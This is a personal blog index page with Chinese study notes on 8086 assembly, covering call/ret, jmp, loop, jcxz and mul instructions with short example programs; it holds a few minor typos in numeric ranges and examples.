<!DOCTYPE html>





<html lang="">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.9.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">

<link rel="stylesheet" href="/css/main.css?v=7.4.0">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.4.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: 'search.xml',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'Kopieren',
      copy_success: 'Kopiert',
      copy_failure: 'Kopieren fehlgeschlagen'
    },
    sidebarPadding: 40
  };
</script>

  <meta name="description" content="Resit much,Obey little">
<meta property="og:type" content="website">
<meta property="og:title" content="ZERO-A-ONE">
<meta property="og:url" content="http://yoursite.com/page/3/index.html">
<meta property="og:site_name" content="ZERO-A-ONE">
<meta property="og:description" content="Resit much,Obey little">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ZERO-A-ONE">
<meta name="twitter:description" content="Resit much,Obey little">
  <link rel="canonical" href="http://yoursite.com/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false,
    isPage: false,
    isArchive: false
  };
</script>

  <title>ZERO-A-ONE</title>
  








  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">
  <div class="container use-motion">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ZERO-A-ONE</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Navigationsleiste an/ausschalten">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
      
      
      
        
        <li class="menu-item menu-item-home">
      
    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>

  </li>
      
      
      
        
        <li class="menu-item menu-item-archives">
      
    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>

  </li>
      <li class="menu-item menu-item-search">
        <a href="javascript:;" class="popup-trigger">
        
          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
      </li>
    
  </ul>

</nav>
  <div class="site-search">
    <div class="popup search-popup">
    <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="none"
           placeholder="Suche..." spellcheck="false"
           type="text" id="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result"></div>

</div>
<div class="search-pop-overlay"></div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
            

          <div id="content" class="content">
            
  <div id="posts" class="posts-expand">
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/06/8086╗π▒α▒╩╝╟03/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/02/06/8086╗π▒α▒╩╝╟03/" class="post-title-link" itemprop="url">8086汇编笔记03</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-02-06 00:09:56 / Geändert am: 16:10:12" itemprop="dateCreated datePublished" datetime="2020-02-06T00:09:56-08:00">2020-02-06</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Call和Ret"><a href="#Call和Ret" class="headerlink" title="Call和Ret"></a>Call和Ret</h2><p>call和ret指令都是转移指令，他们都修改IP，或同时修改CS和IP，他们经常被共同用来实现程序的设计</p>
<h2 id="ret和retf"><a href="#ret和retf" class="headerlink" title="ret和retf"></a>ret和retf</h2><ul>
<li>ret指令用栈中的数据修改IP的内容，从而实现近转移<ul>
<li>CPU执行ret指令时，进行下面两步操作<ul>
<li>(IP)=((ss)*16+(sp))</li>
<li>(sp)=(sp)+2</li>
</ul>
</li>
<li>CPU执行ret指令时，相当于进行：<ul>
<li>pop IP</li>
</ul>
</li>
</ul>
</li>
<li>retf指令用栈中的数据修改CS和IP的内容，从而实现远转移<ul>
<li>CPU执行retf指令时，进行下面两步操作<ul>
<li>(IP)=((ss)*16+(sp))</li>
<li>(sp)=(sp)+2</li>
<li>(CS)=((ss)*16+(sp))</li>
<li>(sp)=(sp)+2</li>
</ul>
</li>
<li>CPU执行ret指令时，相当于进行：<ul>
<li>pop IP</li>
<li>pop CS</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>使用ret的例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">assume  cs:codesg</span><br><span class="line">stack segment</span><br><span class="line">    db 16 dup (0)</span><br><span class="line">stack ends</span><br><span class="line">codesg segment</span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line">start:</span><br><span class="line">    mov ax,stack</span><br><span class="line">    mov ss,ax</span><br><span class="line">    mov sp,16</span><br><span class="line">    mov ax,0</span><br><span class="line">    push ax</span><br><span class="line">    mov bx,0</span><br><span class="line">    ret</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p>使用retf的例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assume  cs:codesg</span><br><span class="line">stack segment</span><br><span class="line">    db 16 dup (0)</span><br><span class="line">stack ends</span><br><span class="line">codesg segment</span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line">start:</span><br><span class="line">    mov ax,stack</span><br><span class="line">    mov ss,ax</span><br><span class="line">    mov sp,16</span><br><span class="line">    mov ax,0</span><br><span class="line">    push ax</span><br><span class="line">    push cs</span><br><span class="line">    mov bx,0</span><br><span class="line">    retf</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<h1 id="call指令"><a href="#call指令" class="headerlink" title="call指令"></a>call指令</h1><p>call指令经常跟ret指令配合使用，因此CPU执行call指令，进行两步操作：</p>
<ul>
<li>将当前的IP或CS和IP压入栈中</li>
<li>转移(jump)</li>
</ul>
<p>call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同</p>
<h4 id="依据位移经行转移的call指令"><a href="#依据位移经行转移的call指令" class="headerlink" title="依据位移经行转移的call指令"></a>依据位移经行转移的call指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 标号 （将当前的IP压栈后，转到标号处执行指令）</span><br></pre></td></tr></table></figure>

<p>CPU执行此种格式的call指令时，进行如下的操作：</p>
<ul>
<li>(sp)=(sp)-2</li>
<li>((ss)*16+(sp))=(IP)</li>
<li>(IP)=(IP)+16位位移</li>
</ul>
<p>相当于进行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp near ptr 标号</span><br></pre></td></tr></table></figure>

<p>一些解释：</p>
<ul>
<li>16位移 = “标号”处的地址 - call指令后的第一个字节的地址</li>
<li>16位位移的范围为-32769~32767，用补码表示</li>
<li>16位位移由编译程序在编译时算出</li>
</ul>
<h4 id="转移的目的地址在指令中的call指令"><a href="#转移的目的地址在指令中的call指令" class="headerlink" title="转移的目的地址在指令中的call指令"></a>转移的目的地址在指令中的call指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call far ptr 标号 （实现的是段间转移）</span><br></pre></td></tr></table></figure>

<p>CPU执行此种格式的指令时，进行如下的操作：</p>
<ul>
<li>(sp)=sp-2</li>
<li>((ss)*16+(sp))=(CS)</li>
<li>(sp)=sp-2</li>
<li>((ss)*16+(sp))=(IP)</li>
<li>(CS)=标号所在的段地址</li>
<li>(IP)=标号所在的段地址</li>
</ul>
<p>相当于进行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp far ptr 标号</span><br></pre></td></tr></table></figure>

<h4 id="转移地址在寄存器中的call指令"><a href="#转移地址在寄存器中的call指令" class="headerlink" title="转移地址在寄存器中的call指令"></a>转移地址在寄存器中的call指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 16位寄存器</span><br></pre></td></tr></table></figure>

<p>CPU执行此种格式的指令时，进行如下的操作：</p>
<ul>
<li>(sp)=(sp)-2</li>
<li>((ss)*16+(sp))=(IP)</li>
<li>(IP)=(16位寄存器)</li>
</ul>
<p>相当于进行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp 16位寄存器</span><br></pre></td></tr></table></figure>

<h4 id="转移地址在内存中的call指令"><a href="#转移地址在内存中的call指令" class="headerlink" title="转移地址在内存中的call指令"></a>转移地址在内存中的call指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call word ptr 内存单元地址</span><br></pre></td></tr></table></figure>

<p>相当于进行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp word ptr 内存单元地址</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov sp,10h</span><br><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">call word ptr ds:[0]</span><br></pre></td></tr></table></figure>

<p>执行后，(IP)=0123H，(sp)=0EH</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call dword ptr 内存单元地址</span><br></pre></td></tr></table></figure>

<p>相当于进行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp dword ptr 内存单元地址</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov sp,10h</span><br><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">call word ptr ds:[0]</span><br></pre></td></tr></table></figure>

<p>执行后，(CS)=0，(IP)=0123H，(sp)=0CH </p>
<h2 id="mul指令"><a href="#mul指令" class="headerlink" title="mul指令"></a>mul指令</h2><p>mul是乘法指令</p>
<ul>
<li>相乘的两个数，要么都是8位，要么都是16位<ul>
<li>8位：AL中和8位寄存器或内存字节单元中</li>
<li>16位：AX中和16位寄存器或内存字节单元中</li>
</ul>
</li>
<li>运算结果<ul>
<li>8位：AX中</li>
<li>16位：DX（高位）和AX（地位）中</li>
</ul>
</li>
</ul>
<p>格式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mul reg</span><br><span class="line">mul	内存单元</span><br></pre></td></tr></table></figure>

<p>内存单元可以用不同的寻址方式给出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mul byte ptr ds:[0]</span><br></pre></td></tr></table></figure>

<p>含义为：(ax)=(al)*((ds)*16+0)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mul word ptr [bx+si+8]</span><br></pre></td></tr></table></figure>

<p>含义为：</p>
<ul>
<li>(ax)=(al)*((ds)*16+(bx)+(si)+8)结果的低16位</li>
<li>(dx)=(al)*((ds)*16+(bx)+(si)+8)结果的高16位</li>
</ul>
<h2 id="参数和结果传递的问题"><a href="#参数和结果传递的问题" class="headerlink" title="参数和结果传递的问题"></a>参数和结果传递的问题</h2><p>子程序一般都要根据提供的参数处理一定的事务，处理后，将结果（返回值）提供给调用者</p>
<p>用寄存器来存储参数和结果是最常使用的方法。对于存放参数的寄存器和存放结果的寄存器，调用者和子程序的读写操作恰恰相反：</p>
<ul>
<li>调用者将参数送入参数寄存器，从结果寄存器中取到返回值</li>
<li>子程序从参数寄存器中取到参数，将返回值送入结果寄存器</li>
</ul>
<p>除了寄存器、内存传递参数外，还有一种通用的方法使用栈来传递参数</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/04/8086╗π▒α▒╩╝╟02/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/02/04/8086╗π▒α▒╩╝╟02/" class="post-title-link" itemprop="url">8086汇编笔记02</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-02-04 22:13:51" itemprop="dateCreated datePublished" datetime="2020-02-04T22:13:51-08:00">2020-02-04</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2020-02-05 14:14:10" itemprop="dateModified" datetime="2020-02-05T14:14:10-08:00">2020-02-05</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="汇编指令与机器码的对应示例"><a href="#汇编指令与机器码的对应示例" class="headerlink" title="汇编指令与机器码的对应示例"></a>汇编指令与机器码的对应示例</h2><table>
<thead>
<tr>
<th align="center">汇编指令</th>
<th align="center">机器指令</th>
</tr>
</thead>
<tbody><tr>
<td align="center">mov ax,0123</td>
<td align="center">B8 23 01</td>
</tr>
<tr>
<td align="center">mov ax,ds:[0123]</td>
<td align="center">A1 23 01</td>
</tr>
<tr>
<td align="center">push ds:[0123]</td>
<td align="center">FF 36 23 01</td>
</tr>
</tbody></table>
<p>可以看到，在一般的汇编指令中，汇编指令中的idata(立即数)，不论它是表示一个数据还是内存单元的偏移地址，都会在对应的机器指令中出现</p>
<h2 id="转移指令"><a href="#转移指令" class="headerlink" title="转移指令"></a>转移指令</h2><p>8086CPU的转移指令分为以下几类</p>
<ul>
<li>无条件转移指令（如：jump）</li>
<li>条件转移指令</li>
<li>循环指令（如：loop）</li>
<li>过程（函数）</li>
<li>中断</li>
</ul>
<h2 id="操作符offset"><a href="#操作符offset" class="headerlink" title="操作符offset"></a>操作符offset</h2><p>操作符offset的功能是取得标号的偏移地址(相对于当前段地址)</p>
<p>例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:	mov ax,offset start;相当于mov ax,0 (cs:offset start)</span><br><span class="line">	s: 	mov ax,offset s	   ;相当于mov ax,3	(cs:offset s)</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<h2 id="jmp指令"><a href="#jmp指令" class="headerlink" title="jmp指令"></a>jmp指令</h2><p>jmp为无条件转移，可以只修改IP，也可以同时修改CS和IP，同时jmp指令需要给出两种信息：</p>
<ul>
<li>转移的目的地址</li>
<li>转移的距离（段间转移、段内短转移、段内近转移）</li>
</ul>
<h4 id="依据位移进行转移的jmp指令"><a href="#依据位移进行转移的jmp指令" class="headerlink" title="依据位移进行转移的jmp指令"></a>依据位移进行转移的jmp指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp short 标号（转移到标号处执行指令）</span><br></pre></td></tr></table></figure>

<p>这种格式的jmp指令实现的是<strong>段内短转移</strong>，它对IP的修改范围为<strong>-128~127</strong>，也就是说它向前转移时可以最多越过<strong>128</strong>个字节，向后转移可以最多越过<strong>127</strong>个字节</p>
<p>例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:	mov ax,0</span><br><span class="line">		jmp short s</span><br><span class="line">		add ax,1</span><br><span class="line">	s: 	inc ax</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p>实际上指令<code>jmp short 标号</code>的功能为(IP)=(IP)+8位位移</p>
<ul>
<li>8位位移 = “标号”处的地址 - jmp指令后的第一个字节的地址</li>
<li>short指明此处的位移为8位位移</li>
<li>8位位移的范围为-128~127，用补码表示</li>
<li>8位位移由编译程序在编译时算出</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp near ptr 标号</span><br></pre></td></tr></table></figure>

<p>这个指令实现的是段内近转移，即(IP)=(IP)+16位位移</p>
<ul>
<li>16位移 = “标号”处的地址 - jmp指令后的第一个字节的地址</li>
<li>near ptr指明此处的位移为16位位移</li>
<li>16位位移的范围为-32769~32767，用补码表示</li>
<li>16位位移由编译程序在编译时算出</li>
</ul>
<h4 id="转移的目的地址在指令中的jmp指令"><a href="#转移的目的地址在指令中的jmp指令" class="headerlink" title="转移的目的地址在指令中的jmp指令"></a>转移的目的地址在指令中的jmp指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp far ptr 标号</span><br></pre></td></tr></table></figure>

<p>实现的是段间转移，又称为远转移</p>
<ul>
<li>（CS）= 标号所在段的段地址</li>
<li>（IP） = 标号所在段中的偏移地址</li>
<li>far ptr 指明了指令用标号的段地址和偏移地址修改了CS和IP</li>
</ul>
<p>例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start:	mov ax,0</span><br><span class="line">		mov bx,0</span><br><span class="line">		jmp far ptr s</span><br><span class="line">		db 256 dup(0)</span><br><span class="line">	s: 	add ax,1</span><br><span class="line">		inc ax</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<h4 id="转移地址在寄存器中的jmp指令"><a href="#转移地址在寄存器中的jmp指令" class="headerlink" title="转移地址在寄存器中的jmp指令"></a>转移地址在寄存器中的jmp指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp 16位寄存器</span><br></pre></td></tr></table></figure>

<p>功能：（IP）= （16位寄存器）</p>
<h4 id="转移地址在内存中的jmp指令"><a href="#转移地址在内存中的jmp指令" class="headerlink" title="转移地址在内存中的jmp指令"></a>转移地址在内存中的jmp指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp word ptr 内存单元地址（段内转移）</span><br></pre></td></tr></table></figure>

<p>功能：从内存单元地址处开始存放着一个字型数据，是转移的目的偏移地址，内存单元地址可用寻址方式的任一格式给出</p>
<p>例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">jmp word ptr ds:[0]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp dword ptr 内存单元地址（段内转移）</span><br></pre></td></tr></table></figure>

<p>功能：从内存单元地址处开始存放着两个字型数据，高地址处的字是转移的目的段地址，低地址是转移的目的偏移地址，内存单元地址可用寻址方式的任一格式给出</p>
<ul>
<li>（CS）=（内存单元地址+2）</li>
<li>（IP）=（内存单元地址）</li>
</ul>
<p>例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov	word ptr ds:[2],0</span><br><span class="line">jmp dword ptr ds:[0]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov	word ptr [bx+2],0</span><br><span class="line">jmp dword ptr [bx]</span><br></pre></td></tr></table></figure>

<h2 id="jcxz指令"><a href="#jcxz指令" class="headerlink" title="jcxz指令"></a>jcxz指令</h2><p>jcxz指令为有条件转移指令，所有的有条件转移指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为<strong>-128~127</strong>，一般的有条件转移指令看的都是cx寄存器，例如loop指令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jcxz 标号	（如果（cx）=0，则转移到标号初执行）</span><br></pre></td></tr></table></figure>

<p>jcxz实际的指令操作：</p>
<ul>
<li>当（cx）= 0时，（IP）=（IP）+ 8位位移<ul>
<li>8位位移 = “标号”处的地址 - jcxz指令后的第一个字节的地址</li>
<li>8位位移的范围为-128~127，用补码表示</li>
<li>8位位移由编译程序在编译时算出</li>
</ul>
</li>
<li>当（cx）=0时，什么也不做（程序向下执行）</li>
</ul>
<p>其实也可以理解为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if((cx)==0)</span><br><span class="line">	jmp short 标号</span><br></pre></td></tr></table></figure>

<h2 id="loop指令"><a href="#loop指令" class="headerlink" title="loop指令"></a>loop指令</h2><p>loop指令为循环指令，所有的循环指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为<strong>-128~127</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loop 标号</span><br></pre></td></tr></table></figure>

<p>loop实际的指令操作：</p>
<ul>
<li><p>（cx）=（cx）- 1</p>
</li>
<li><p>当（cx）！= 0时，（IP）=（IP）+ 8位位移</p>
<ul>
<li>8位位移 = “标号”处的地址 - loop指令后的第一个字节的地址</li>
<li>8位位移的范围为-128~127，用补码表示</li>
<li>8位位移由编译程序在编译时算出</li>
</ul>
</li>
<li><p>当（cx）=0时，什么也不做（程序向下执行）</p>
</li>
</ul>
<p>其实也可以理解为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(cx)--;</span><br><span class="line">if((cx)!=0)</span><br><span class="line">	jmp short 标号</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/04/8086╗π▒α▒╩╝╟01/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/02/04/8086╗π▒α▒╩╝╟01/" class="post-title-link" itemprop="url">8086汇编笔记01</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-02-04 00:13:32 / Geändert am: 16:13:50" itemprop="dateCreated datePublished" datetime="2020-02-04T00:13:32-08:00">2020-02-04</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
